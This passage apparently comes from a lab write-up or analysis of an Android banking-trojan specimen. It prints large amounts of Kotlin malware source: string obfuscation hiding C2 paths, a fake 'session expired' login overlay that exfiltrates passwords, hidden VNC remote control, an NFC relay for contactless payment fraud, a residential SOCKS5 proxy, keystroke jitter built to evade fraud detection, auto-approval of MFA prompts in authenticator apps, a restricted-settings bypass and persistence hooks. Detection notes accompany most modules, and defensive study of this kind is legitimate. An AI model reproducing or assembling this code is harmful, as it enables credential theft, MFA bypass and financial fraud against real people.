    // XOR key: "K3y!Tak0pii-Lab!" (16 bytes)
    private val XOR_KEY = byteArrayOf(
        0x4B, 0x33, 0x79, 0x21, 0x54, 0x61, 0x6B, 0x30,
        0x70, 0x69, 0x69, 0x2D, 0x4C, 0x61, 0x62, 0x21
    )

    // AES-CBC: key "TakopiiSecretKey", IV "InitVector123456"
    private val AES_KEY = byteArrayOf(/* 16 bytes */)
    private val AES_IV = byteArrayOf(/* 16 bytes */)

    // (1) XOR — fast, for bulk strings (C2 paths, permission names)
    fun xorDecode(encoded: ByteArray): String {
        return String(ByteArray(encoded.size) { i ->
            (encoded[i].toInt() xor XOR_KEY[i % XOR_KEY.size].toInt()).toByte()
        })
    }

    // (2) AES-CBC — slow, for high-value strings (target package names)
    fun aesDecrypt(b64: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(AES_KEY, "AES"), IvParameterSpec(AES_IV))
        return String(cipher.doFinal(Base64.decode(b64, Base64.NO_WRAP)))
    }

    // (3) Pre-encoded string registry — lazy decode at first access
    object Strings {
        val C2_REGISTER by lazy { xorDecode(xorEncode("/api/v1/register")) }
        val C2_COMMANDS by lazy { xorDecode(xorEncode("/api/v1/commands")) }
        val TARGET_DVBANK by lazy { aesDecrypt(aesEncrypt("com.dvbank.example")) }
        val PERM_SMS by lazy { xorDecode(xorEncode("android.permission.RECEIVE_SMS")) }
        val PERM_A11Y by lazy { xorDecode(xorEncode("android.permission.BIND_ACCESSIBILITY_SERVICE")) }
    }
}
```

Two-tier obfuscation: XOR for bulk strings (C2 endpoints, permission names), AES-CBC for high-value strings (target package names). The `Strings` object uses `by lazy` so decoding happens only at first access — EarlyInitProvider.onCreate() touches these lazily to force decode before Application.onCreate(). jadx decompilation shows only byte arrays and crypto calls, never the plaintext C2 URLs or target packages. Real Anatsa uses XOR with per-build key; SharkBot stores the AES key in the native library (research/06).

**Frontier 2025-2026 Modules:**
- `A11yOverlay2032.kt` — `TYPE_ACCESSIBILITY_OVERLAY` (bypasses SYSTEM_ALERT_WINDOW)
- `HiddenVnc.kt` — MediaProjection + Accessibility remote control
- `NfcRelay.kt` — ghost-tap NFC relay (RatOn pattern)
- `ResidentialProxy.kt` — SOCKS5 residential proxy (Mirax pattern)
- `BehaviorMimicry.kt` — Herodotus-pattern typing jitter (300-3000ms)
- `SsoHijacker.kt` — enterprise SSO notification auto-approve (Vespertine pattern)
- `TeeOffload.kt` — TEE/TrustZone dispatch facade (Drelock pattern)
- `YamuxProxy.kt` — Yamux multiplexed C2 transport (Klopatra pattern)
- `PerBuildObfuscation.kt` — per-build decoder regeneration
- `PlayIntegrityProbe.kt` — Play Integrity verdict shape inspection
- `CertPinnerProbe.kt` — target-app cert-pinning recon (ANALYSIS.md §6 asymmetry)
- `RestrictedSettingsBypass.kt` — Android 13+ restricted settings bypass (Zombinder + session-install + social engineering)

### CertPinnerProbe — Target Pinning Reconnaissance

**Source: CertPinnerProbe.kt**
```kotlin
// File: overlay-banker/.../frontier/CertPinnerProbe.kt (actual specimen code)

// Pinning indicators the banker searches for in target apps
private val PINNING_INDICATORS = listOf(
    "CertificatePinner",           // OkHttp pinning
    "network_security_config",     // Android NSC
    "TrustManagerFactory",         // Custom TrustManager
    "X509TrustManager",            // Custom trust validation
    "sha256/",                     // Pin hash format
    "pin-sha256",                  // HPKP-style pin
)

data class PinningAssessment(
    val targetPackage: String,
    val hasPinning: Boolean,
    val pinningType: String?,    // "okhttp", "nsc", "custom_trustmanager"
    val mitmViable: Boolean,     // Can attacker MITM this target?
    val recommendation: String,  // "overlay_only" or "mitm_possible"
)

fun assessTarget(targetPackage: String, indicators: List<String>): PinningAssessment {
    // ... classify pinning type from indicators ...
    val recommendation = when {
        !hasPinning -> "mitm_possible"   // No pinning = MITM the target's API
        else -> "overlay_only"           // Pinned = overlay capture only
    }
    Exfil.event("pinning_probe", "target" to targetPackage,
        "mitm_viable" to mitmViable.toString())
    return result
}
```

ANALYSIS.md §6 asymmetry: banker does NOT pin own C2 (DGA domains = unpredictable certs, infrastructure rotates). Banker PROBES whether target banking apps pin theirs. If target doesn't pin → attacker can MITM target's API on compromised device (install CA cert → read all traffic). If target pins → overlay capture still works (UI-level, not network-level). Defender exploitation: mount mitmproxy → banker accepts self-signed cert → full C2 protocol visible.

### RestrictedSettingsBypass — Zombinder Pattern

**Source: RestrictedSettingsBypass.kt**
```kotlin
// File: overlay-banker/.../frontier/RestrictedSettingsBypass.kt (actual specimen code)

// Android 13+ blocks sideloaded apps from Accessibility + NLS binding
// 4 bypass methods:

// METHOD 1 — Check if restriction applies
fun isRestricted(context: Context): Boolean {
    if (Build.VERSION.SDK_INT < 33) return false  // Pre-Android 13: no restriction
    val installer = if (Build.VERSION.SDK_INT >= 30) {
        context.packageManager.getInstallSourceInfo(context.packageName).installingPackageName
    } else {
        @Suppress("DEPRECATION")
        context.packageManager.getInstallerPackageName(context.packageName)
    }
    val trustedInstallers = listOf("com.android.vending", "com.google.android.packageinstaller")
    return installer !in trustedInstallers  // Not from Play Store = restricted
}

// METHOD 3 — Social engineering bypass
fun guideUserToOverride(context: Context) {
    Exfil.event("restricted_settings_bypass_attempt", "method" to "social_engineering")
    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
        data = Uri.parse("package:${context.packageName}")
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)  // Opens app settings page with override option
}

// Verify if A11y binding succeeded post-bypass
fun isAccessibilityBindable(context: Context): Boolean {
    val service = "${context.packageName}/.stealer.BankerA11yService"
    val enabledServices = Settings.Secure.getString(
        context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
    ) ?: return false
    return enabledServices.contains(service)
}
```

4 bypass methods: (1) Zombinder — Play Store dropper installs banker, Android treats as "store-installed"; (2) Session-based PackageInstaller API; (3) Social engineering — guide user through manual override; (4) Android 16 Beta 4 cooldown timer race (research). Detection: `PackageInstaller.Session` from non-system app + subsequent A11y/NLS binding within 60s = Zombinder shape.

### Frontier 2025-2026 — Deep Source Analysis

**A11yOverlay2032.kt — TYPE_ACCESSIBILITY_OVERLAY (Window Type 2032)**

```kotlin
// File: overlay-banker/.../frontier/A11yOverlay2032.kt (actual specimen code)

object A11yOverlay2032 {

    private const val TYPE_A11Y_OVERLAY = 2032

    // (1) Show overlay WITHOUT SYSTEM_ALERT_WINDOW permission
    //     Accessibility grant IS the overlay permission on Android 10+
    fun showLoginOverlay(service: AccessibilityService, targetApp: String) {
        val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val params = WindowManager.LayoutParams().apply {
            type = TYPE_A11Y_OVERLAY  // 2032 — bypasses SAW entirely
            format = PixelFormat.TRANSLUCENT
            flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        val layout = buildLoginView(service, targetApp)
        try {
            wm.addView(layout, params)
        } catch (_: Exception) {
            // (2) Fallback to TYPE_APPLICATION_OVERLAY (2038) if 2032 unavailable
            params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            try { wm.addView(layout, params) } catch (_: Exception) {}
        }
    }

    // (3) Fake "Session Expired" login captures username + password
    private fun buildLoginView(context: Context, targetApp: String): LinearLayout {
        // ... constructs login form with EditText fields ...
        // On "Sign In" click:
        Exfil.credential(targetApp, "username", user)
        Exfil.credential(targetApp, "password", pass)
    }
}
```

Critical 2025-2026 evolution: Crocodilus (March 2025) first observed using window type 2032. Pre-2025 detection rules checking for `SYSTEM_ALERT_WINDOW` in manifest miss this entirely -- the permission is not present. The overlay piggybacks on the AccessibilityService grant. The fallback to TYPE_APPLICATION_OVERLAY (2038) handles older Android versions gracefully. Detection pivot: look for `WindowManager.LayoutParams` with type=2032 in bytecode + `BIND_ACCESSIBILITY_SERVICE` in manifest.

**HiddenVnc.kt — MediaProjection Remote Control (Klopatra Pattern)**

```kotlin
// File: overlay-banker/.../frontier/HiddenVnc.kt (actual specimen code)

object HiddenVnc {

    // (1) Screen capture via VirtualDisplay + ImageReader at half-resolution
    fun startCapture(fps: Int = 2) {
        imageReader = ImageReader.newInstance(
            screenWidth / 2, screenHeight / 2,  // half-res for bandwidth
            android.graphics.PixelFormat.RGBA_8888, 2
        )
        virtualDisplay = proj.createVirtualDisplay(
            "DocReaderSync",  // innocent VirtualDisplay name
            screenWidth / 2, screenHeight / 2, screenDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
    }

    // (2) Frame encode: JPEG quality 30 — ~15KB per frame at 540x1170
    private fun captureFrame() {
        val bitmap = Bitmap.createBitmap(/* from ImageReader planes */)
        bitmap.compress(Bitmap.CompressFormat.JPEG, 30, stream)
        onFrameCaptured?.invoke(stream.toByteArray())
    }

    // (3) Remote command dispatch via Accessibility gestures
    fun executeCommand(service: AccessibilityService, command: VncCommand) {
        when (command) {
            is VncCommand.Tap -> BehaviorMimicry.tapWithJitter(service, command.x, command.y)
            is VncCommand.Type -> { /* find focused EditText, ACTION_SET_TEXT */ }
            is VncCommand.Back -> service.performGlobalAction(GLOBAL_ACTION_BACK)
            is VncCommand.Home -> service.performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }

    sealed class VncCommand {
        data class Tap(val x: Float, val y: Float) : VncCommand()
        data class Swipe(val startX: Float, val startY: Float, val endX: Float, val endY: Float) : VncCommand()
        data class Type(val text: String) : VncCommand()
        object Back : VncCommand()
        object Home : VncCommand()
        object Recents : VncCommand()
    }
}
```

Two-axis remote control: MediaProjection captures what the user sees (screen frames streamed to C2 at 2fps), AccessibilityService dispatches what the operator wants (tap/swipe/type commands). Klopatra wraps this in Virbox-protected native code + Yamux-multiplexed transport. The `VirtualDisplay` name "DocReaderSync" matches the app camouflage. Half-resolution + JPEG q30 reduces per-frame bandwidth to ~15KB -- sustainable on mobile data. Detection: `MediaProjection` active + `AccessibilityService` binding + high-frequency `dispatchGesture()` from non-foreground process.

**NfcRelay.kt — Ghost-Tap NFC Relay (RatOn Pattern)**

```kotlin
// File: overlay-banker/.../frontier/NfcRelay.kt (actual specimen code)

class NfcRelayService : HostApduService() {

    companion object {
        private const val RELAY_HOST = "10.0.2.2"  // Lab: emulator loopback
        private const val RELAY_PORT = 9999

        // SELECT AID for PPSE (Proximity Payment System Environment)
        private val SELECT_PPSE = byteArrayOf(
            0x00, 0xA4.toByte(), 0x04, 0x00, 0x0E,
            0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53,
            0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0x00
        ) // "2PAY.SYS.DDF01"
    }

    // (1) APDU relay: POS → NFC stack → this service → TCP → attacker phone → POS
    override fun processCommandApdu(commandApdu: ByteArray, extras: Bundle?): ByteArray {
        val response = relayApdu(commandApdu)
        return response ?: byteArrayOf(0x6F.toByte(), 0x00) // SW_UNKNOWN on failure
    }

    // (2) Wire protocol: [2 bytes length][N bytes APDU data]
    private fun relayApdu(apdu: ByteArray): ByteArray? {
        val output = relayOutput ?: return null
        val input = relayInput ?: return null
        output.writeShort(apdu.size)
        output.write(apdu)
        output.flush()
        val respLen = input.readUnsignedShort()
        val response = ByteArray(respLen)
        input.readFully(response)
        return response
    }
}
```

NFC ghost-tap attack: attacker holds phone near POS terminal, commands relay over TCP to victim's phone where HostApduService emulates the victim's payment card. The wire protocol is minimal -- 2-byte length prefix + raw APDU bytes. Latency budget is tight (~500ms round-trip for NFC transaction timeout). The SELECT_PPSE AID ("2PAY.SYS.DDF01") is the standard contactless payment entry point. Detection: HostApduService binding + concurrent TCP socket to non-standard port + APDU-shaped traffic.

**ResidentialProxy.kt — SOCKS5 Proxy (Mirax Pattern)**

```kotlin
// File: overlay-banker/.../frontier/ResidentialProxy.kt (actual specimen code)

object ResidentialProxy {

    @Volatile var activeSessions = 0

    // (1) Full SOCKS5 handshake implementation
    private suspend fun handleClient(client: Socket) {
        activeSessions++
        val input = client.getInputStream()
        val output = client.getOutputStream()

        // Greeting: 0x05 0x01 0x00 (SOCKS5, 1 method, NO AUTH)
        val greeting = ByteArray(3); input.read(greeting)
        output.write(byteArrayOf(0x05, 0x00))  // Accept no-auth

        // Connect request: parse address type (IPv4=0x01, Domain=0x03)
        val header = ByteArray(4); input.read(header)
        val (host, port) = when (header[3].toInt()) {
            0x01 -> { /* IPv4: 4 bytes addr + 2 bytes port */ }
            0x03 -> { /* Domain: 1 byte len + N bytes domain + 2 bytes port */ }
        }

        // (2) Bidirectional relay: client ↔ target
        val target = Socket()
        target.connect(InetSocketAddress(host, port), 5000)
        output.write(byteArrayOf(0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0)) // success
        launch { relay(client.getInputStream(), target.getOutputStream()) }
        launch { relay(target.getInputStream(), client.getOutputStream()) }
    }
}
```

Post-ATS monetization shift: after one-shot credential theft ($50-300/infection), the device persists as a residential proxy node. Victim's clean residential IP sold on proxy marketplaces at $20-80/month -- long-tail revenue. The SOCKS5 implementation supports both IPv4 and domain resolution. C2 tunnels traffic through the device, exiting from the victim's IP for credential stuffing, ad fraud, or scraping. Detection: SOCKS5 handshake (0x05 greeting) on high port from non-browser process + JA4 fingerprint of the TLS wrapper.

**BehaviorMimicry.kt — Herodotus Typing Jitter**

```kotlin
// File: overlay-banker/.../frontier/BehaviorMimicry.kt (actual specimen code)

object BehaviorMimicry {

    // (1) Original Herodotus: uniform(300, 3000) ms inter-keystroke
    fun interKeystrokeDelay(): Long = rng.nextLong(300, 3001)

    // (2) Improved: log-normal defeats uniform-distribution detection (BioCatch March 2026)
    //     ln(delay) ~ N(6.2, 0.5) → median ~493ms, 95th percentile ~1340ms
    fun improvedKeystrokeDelay(): Long {
        val logDelay = 6.2 + rng.nextGaussian() * 0.5
        return Math.exp(logDelay).toLong().coerceIn(200, 4000)
    }

    // (3) Tap coordinate jitter: gaussian(target, sigma=5px) — natural finger drift
    fun jitteredTap(x: Float, y: Float): Pair<Float, Float> {
        val jitterX = (rng.nextGaussian() * 5.0).toFloat()
        val jitterY = (rng.nextGaussian() * 5.0).toFloat()
        return Pair(x + jitterX, y + jitterY)
    }

    // (4) Press duration: 50-150ms (human finger contact time)
    fun tapWithJitter(service: AccessibilityService, x: Float, y: Float) {
        val (jx, jy) = jitteredTap(x, y)
        val pressDuration = rng.nextLong(50, 151)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, pressDuration))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    // (5) Scroll: quadratic bezier for acceleration/deceleration curve
    fun humanScroll(service: AccessibilityService, startX: Float, startY: Float, distance: Float) {
        val path = Path().apply {
            moveTo(startX, startY)
            quadTo(startX, startY - distance * 0.5f, startX + rng.nextFloat() * 3f, startY - distance)
        }
    }

    // (6) Think time: exponential(mean=2s) — -2000 * ln(U), clamped 500-8000ms
    fun thinkTime(): Long {
        val u = rng.nextDouble(0.001, 1.0)
        return (-2000.0 * Math.log(u)).toLong().coerceIn(500, 8000)
    }

    // Box-Muller transform for Gaussian RNG
    private fun Random.nextGaussian(): Double {
        val u1 = nextDouble(0.001, 1.0); val u2 = nextDouble(0.001, 1.0)
        return Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2)
    }
}
```

Five axes of human mimicry: (1) inter-keystroke timing defeats fixed-interval detection, (2) log-normal distribution defeats BioCatch's March 2026 uniform-distribution detector (78-92% catch rate on original Herodotus), (3) Gaussian tap coordinate jitter with sigma=5px matches empirical human finger placement variance, (4) variable press duration 50-150ms mimics natural finger-lift patterns, (5) quadratic bezier scroll path adds realistic acceleration/deceleration. The `thinkTime()` exponential distribution models the pause when a human reads a label before acting. Used by both ATS engine and HiddenVnc command dispatch.

**SsoHijacker.kt — Enterprise SSO Auto-Approve (Vespertine Pattern)**

```kotlin
// File: overlay-banker/.../frontier/SsoHijacker.kt (actual specimen code)

object SsoHijacker {

    // 5 SSO apps monitored: Microsoft Authenticator, Okta, Duo, Google, Authy
    private val SSO_APPS = listOf(
        "com.azure.authenticator", "com.okta.android.auth",
        "com.duosecurity.duomobile", "com.google.android.apps.authenticator2",
        "com.authy.authy",
    )

    // Multilingual approve patterns: English + Turkish + Spanish
    private val APPROVE_PATTERNS = listOf(
        "approve", "allow", "yes", "confirm", "accept", "verify", "it's me",
        "onayla", "kabul et", "aprobar", "aceptar",
    )

    // (1) Microsoft number-match detection
    private val NUMBER_MATCH_REGEX = Regex("\\b(\\d{2})\\b")

    // (2) Auto-approve: scan A11y tree for clickable "Approve" buttons
    fun autoApprove(service: AccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        for (pattern in APPROVE_PATTERNS) {
            val nodes = root.findAccessibilityNodeInfosByText(pattern)
            for (node in nodes ?: emptyList()) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
                // (3) Parent-click fallback — button text in child, click on parent
                val parent = node.parent
                if (parent?.isClickable == true) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
            }
        }
        return false
    }

    // (4) Microsoft number-match flow: type the 2-digit number into input field
    fun handleNumberMatch(service: AccessibilityService, number: String): Boolean {
        val root = service.rootInActiveWindow ?: return false
        val inputs = findEditTexts(root)
        for (input in inputs) {
            val args = Bundle().apply {
                putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, number)
            }
            input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            return autoApprove(service)  // then click approve
        }
        return false
    }
}
```

First commodity banker targeting enterprise SSO (May 2026). Kill chain: attacker triggers login with stolen creds on corporate portal, SSO provider pushes MFA notification, banker's NLS captures it, A11y auto-clicks "Approve" within 500ms. User sees notification flash and disappear. Microsoft Authenticator's number-match defense is handled separately -- banker reads the 2-digit number from notification, finds the EditText in the Authenticator UI, types the number, then clicks approve. The parent-click fallback handles Material Design button layouts where the clickable region is on the parent container, not the text child. Detection: SSO notification + A11y auto-click within 500ms on non-foreground SSO app = Vespertine signal.

**TeeOffload.kt — TEE/TrustZone Crypto (Drelock Pattern)**

```kotlin
// File: overlay-banker/.../frontier/TeeOffload.kt (actual specimen code)

object TeeOffload {

    private const val KEY_ALIAS = "docreader_sync_key"

    // (1) Probe device TEE capabilities: StrongBox vs TEE vs none
    fun probeCapabilities(): TeeCapability {
        val strongBox = if (Build.VERSION.SDK_INT >= 28) {
            try {
                KeyGenParameterSpec.Builder("probe_sb", KeyProperties.PURPOSE_ENCRYPT)
                    .setIsStrongBoxBacked(true).build()
                true
            } catch (_: Exception) { false }
        } else false
        val tee = try { KeyStore.getInstance("AndroidKeyStore").apply { load(null) }; true }
            catch (_: Exception) { false }
        return TeeCapability(strongBox, tee, false, Build.VERSION.SDK_INT >= 24)
    }

    // (2) Generate AES-256-GCM key INSIDE TEE — key material never leaves hardware
    fun generateTeeKey(): Boolean {
        val keyGen = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
        keyGen.init(KeyGenParameterSpec.Builder(KEY_ALIAS,
            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(256).build())
        keyGen.generateKey()
        return true
    }

    // (3) Encrypt: plaintext enters TEE, ciphertext exits. Key stays inside.
    fun encrypt(plaintext: ByteArray): ByteArray? {
        val key = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
            .getKey(KEY_ALIAS, null) as? SecretKey ?: return null
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, key)
        return cipher.iv + cipher.doFinal(plaintext)  // IV + ciphertext
    }

    // (4) Decrypt: 12-byte IV prefix + ciphertext
    fun decrypt(data: ByteArray): ByteArray? {
        val iv = data.sliceArray(0 until 12)
        val ciphertext = data.sliceArray(12 until data.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(128, iv))
        return cipher.doFinal(ciphertext)
    }
}
```

Drelock (June 2026) -- first commodity banker using TEE for C2 payload encryption. Frida hooks on `Cipher.doFinal()` see plaintext going in but cannot extract the key to decrypt captured network traffic offline. Root/Magisk do not help -- TEE is hardware-isolated. StrongBox (Titan M, Samsung eSE) is the strongest tier; ARM TrustZone is the fallback available on most modern phones. Analyst counter: intercept at network layer (mitmproxy) before/after TEE encrypt/decrypt -- the ciphertext still transits normal memory. Or hook `Cipher.doFinal()` to capture plaintext at call site before it enters TEE.

**YamuxProxy.kt — Multiplexed C2 Transport (Klopatra/Mirax Pattern)**

```kotlin
// File: overlay-banker/.../frontier/YamuxProxy.kt (actual specimen code)

object YamuxProxy {

    // 4 frame types + 4 flags + 12-byte header
    private const val TYPE_DATA = 0; private const val TYPE_WINDOW_UPDATE = 1
    private const val TYPE_PING = 2; private const val TYPE_GO_AWAY = 3
    private const val FLAG_SYN = 1; private const val FLAG_ACK = 2
    private const val FLAG_FIN = 4; private const val FLAG_RST = 8
    private const val HEADER_SIZE = 12

    // (1) Kotlin fallback encoder: [1 ver][1 type][2 flags][4 streamId][4 length][N payload]
    private fun encodeYamuxKotlin(type: Int, flags: Int, streamId: Int, payload: ByteArray?): ByteArray {
        val buf = ByteBuffer.allocate(HEADER_SIZE + (payload?.size ?: 0))
        buf.put(0); buf.put(type.toByte()); buf.putShort(flags.toShort())
        buf.putInt(streamId); buf.putInt(payload?.size ?: 0)
        if (payload != null) buf.put(payload)
        return buf.array()
    }

    // (2) Demux loop: read 12-byte headers, route by stream type
    private suspend fun readMuxLoop() {
        while (isRunning) {
            val header = ByteArray(HEADER_SIZE); readFully(input, header)
            val decoded = NativeProtect.decodeYamux(header) ?: decodeYamuxKotlin(header)
            when (decoded[0]) {
                TYPE_DATA -> handleData(streamId, flags, payload)
                TYPE_WINDOW_UPDATE -> handleWindowUpdate(streamId, delta)
                TYPE_PING -> handlePing(streamId, flags)
                TYPE_GO_AWAY -> handleGoAway()
            }
        }
    }

    // (3) Stream allocation: odd IDs = client-initiated
    data class StreamState(val id: Int, val type: String, var window: Int = 256*1024, var open: Boolean = true)
    // Stream 1: C2 commands, Stream 2+: SOCKS5 proxy, Stream N: VNC frames

    // (4) Local SOCKS5 → Yamux bridge: each local connection gets own stream
    private suspend fun startLocalProxy(port: Int) {
        localProxy = ServerSocket(port)
        while (isRunning) {
            val client = localProxy?.accept() ?: break
            val streamId = allocateStream("socks5")
            launch { sendFrame(TYPE_DATA, FLAG_SYN, streamId, null); relayClientToMux(client, streamId) }
        }
    }
}
```

Single TCP connection carries C2 commands + proxy data + VNC frames -- firewalls see one long-lived connection instead of burst patterns. Stream isolation via 4-byte stream IDs with per-stream flow control (256KB window). Native C encode/decode via NativeProtect for throughput; Kotlin fallback if .so not loaded. The 12-byte Yamux header is visible in packet capture and forms a family-specific fingerprint. Klopatra wraps this in Virbox-protected .so; Mirax uses it for SOCKS5 residential proxy muxing. Detection: single long-lived TCP with 12-byte header pattern + multiplexed stream behavior.

**PerBuildObfuscation.kt — AI-Pipelined Decoder Regeneration (Apex Pattern)**

```kotlin
// File: overlay-banker/.../frontier/PerBuildObfuscation.kt (actual specimen code)

object PerBuildObfuscation {

    private val BUILD_SEED: Long = System.currentTimeMillis()

    // Derived keys: each build gets unique XOR key (32b), ROT amount (1-7), ADD key (16b)
    init {
        val rng = SecureRandom(longToBytes(BUILD_SEED))
        xorKey = ByteArray(32).also { rng.nextBytes(it) }
        rotAmount = rng.nextInt(7) + 1
        addKey = ByteArray(16).also { rng.nextBytes(it) }
    }

    // (1) 4-layer encode: XOR → ROT → ADD → shuffle
    fun encode(plaintext: String): ByteArray {
        var data = plaintext.toByteArray()
        data = xorLayer(data, xorKey)                // Layer 1: XOR with build key
        data = rotLayer(data, rotAmount)             // Layer 2: byte rotation
        data = addLayer(data, addKey)                // Layer 3: additive cipher
        data = shuffleLayer(data, BUILD_SEED)        // Layer 4: Fisher-Yates shuffle
        return data
    }

    // (2) Reverse: unshuffle → subtract → reverse-ROT → XOR
    fun decode(encoded: ByteArray): String {
        var data = encoded.copyOf()
        data = unshuffleLayer(data, BUILD_SEED)
        data = subLayer(data, addKey)
        data = rotLayer(data, 256 - rotAmount)       // reverse rotation
        data = xorLayer(data, xorKey)                // XOR is symmetric
        return String(data)
    }

    // (3) Build fingerprint: SHA-256 of seed → 8 hex bytes → C2 identifies build variant
    fun buildFingerprint(): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(BUILD_SEED.toString().toByteArray())
            .take(8).joinToString("") { "%02x".format(it) }
    }
}
```

YARA signature fragility demonstrated: the 4-layer encode chain produces different byte patterns per build because BUILD_SEED changes. A YARA rule targeting the encoded blob from build N fails on build N+1. Real Apex uses ML-generated AST transformations -- the decoder function itself has different bytecode structure per build. Defender must shift to behavioral/invariant detection: regardless of decoder shape, the runtime behavior (C2 poll + A11y capture + overlay) is identical. The `buildFingerprint()` lets C2 track which build variant each bot runs.

**PlayIntegrityProbe.kt — Attacker-Side PI Reconnaissance**

```kotlin
// File: overlay-banker/.../frontier/PlayIntegrityProbe.kt (actual specimen code)

object PlayIntegrityProbe {

    private val PI_INDICATORS = listOf(
        "com.google.android.play.core.integrity", "com.google.android.gms.integrity",
        "IntegrityTokenRequest", "IntegrityTokenResponse",
        "IntegrityServiceClient", "StandardIntegrityManager",
    )
    private const val MIN_GMS_VERSION_FOR_PI = 230815000L

    data class ProbeResult(
        val targetPackage: String, val hasPlayIntegrity: Boolean,
        val confidence: String, val recommendation: String, // "ats_safe" | "credential_only" | "skip"
    )

    // (1) Probe: check target APK components for PI library class names
    private fun checkTargetDependencies(context: Context, targetPackage: String): Boolean {
        val pkgInfo = context.packageManager.getPackageInfo(targetPackage,
            GET_ACTIVITIES or GET_SERVICES or GET_RECEIVERS or GET_PROVIDERS)
        val allComponents = mutableListOf<String>()
        pkgInfo.activities?.forEach { allComponents.add(it.name) }
        pkgInfo.services?.forEach { allComponents.add(it.name) }
        // ... match against PI_INDICATORS ...
    }

    // (2) GMS version check: PI requires Play Services 230815000+
    private fun checkGmsVersion(context: Context): Boolean {
        val gmsInfo = context.packageManager.getPackageInfo("com.google.android.gms", 0)
        return gmsInfo.versionCode.toLong() >= MIN_GMS_VERSION_FOR_PI
    }

    // (3) Decision matrix: PI present → credential_only; PI absent → ats_safe
    fun probeTarget(context: Context, targetPackage: String): ProbeResult {
        val hasPI = checkTargetDependencies(context, targetPackage) ||
            (checkTargetPermissions(context, targetPackage) && checkGmsVersion(context))
        val recommendation = if (hasPI) "credential_only" else "ats_safe"
        return ProbeResult(targetPackage, hasPI, confidence, recommendation)
    }

    // (4) Batch probe all targets — decides per-app attack strategy
    fun probeAllTargets(context: Context, targets: List<String>): Map<String, ProbeResult> {
        return targets.associateWith { probeTarget(context, it) }
    }
}
```

Attacker-side intelligence gathering: banker probes whether each target banking app integrates Play Integrity before choosing attack strategy. If PI present (server verifies `device_integrity=true`), ATS transfers will be rejected on rooted/hooked device -- banker falls back to credential-only theft (sell creds on darknet). If PI absent, full ATS is viable. Three probe methods: (1) PackageManager component scan for PI library classes, (2) GMS version check (PI requires Aug 2023+), (3) permission cross-reference. The `probeAllTargets()` batch operation decides per-app monetization strategy at scale. Detection: app querying other apps' component lists via PackageManager + cross-referencing play-integrity library names = reconnaissance signal.

**Persistence:**
- `StealthFgService.kt` — foreground service (`FOREGROUND_SERVICE_SPECIAL_USE`)
- `BootReceiver.kt` — `BOOT_COMPLETED` restart
- `EarlyInitProvider.kt` — ContentProvider pre-Application init hook
- `WorkManagerBeacon.kt` — 15-min periodic C2 beacon

### Persistence — Deep Source Analysis

**EarlyInitProvider.kt — ContentProvider Pre-Application Init Hook**

```kotlin
// File: overlay-banker/.../persistence/EarlyInitProvider.kt (actual specimen code)

class EarlyInitProvider : ContentProvider() {

    // (1) Runs BEFORE Application.onCreate() — earliest possible init point
    override fun onCreate(): Boolean {
        val ctx = context ?: return true

        // Step 1: Decode all obfuscated strings into memory cache
        // jadx shows only byte arrays; decoded strings only exist in heap at runtime
        initDecodedStrings()

        // Step 2: Run environment gate (anti-debug/emulator/frida)
        // If hostile environment detected HERE, Application.onCreate() skips all stealer init
        EnvironmentGate.evaluate(ctx)

        return true
    }

    private fun initDecodedStrings() {
        // Touch lazy-init Strings object — forces XOR/AES decode of all constants
        try {
            StringDecoder.Strings.C2_REGISTER   // "/api/v1/register"
            StringDecoder.Strings.C2_COMMANDS    // "/api/v1/commands"
            StringDecoder.Strings.C2_EXFIL       // "/api/v1/exfil"
        } catch (_: Exception) {}
    }

    // (2) All CRUD operations are no-ops — this is NOT a real ContentProvider
    override fun query(u: Uri, p: Array<String>?, s: String?, a: Array<String>?, o: String?): Cursor? = null
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, sel: String?, args: Array<String>?): Int = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}
```

